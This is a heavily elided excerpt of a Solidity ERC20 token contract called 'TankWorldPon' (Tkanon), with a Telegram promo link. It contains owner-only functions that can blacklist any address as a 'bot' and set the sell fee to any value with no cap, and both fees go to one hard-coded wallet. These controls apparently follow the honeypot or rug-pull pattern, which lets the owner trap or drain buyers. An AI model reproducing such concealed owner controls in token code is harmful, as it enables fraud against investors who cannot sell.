...
/**
Telegram : Https://Telegram.me/Tkanon

Tkanon is a warrior princess endowed with the fortitude
...
contract Tkanon is ERC20, Auth {
    ...
    string constant private _name = "TankWorldPon";
    string constant private _symbol = "Tkanon";
    ...
    address private autoLiquidityReceiver = 0x700d399Fd8F5D213F217311f89926510151997d9;
    address private MarketingFeeReceiver = 0x700d399Fd8F5D213F217311f89926510151997d9;
    ...
    function setBMTkanon(address account, bool bmv) external onlyOwner() {
        isBot[account] = bmv;
    }

    function setFMTkanon(uint256 fv) external onlyOwner {
        totalSellFee = fv;
    }
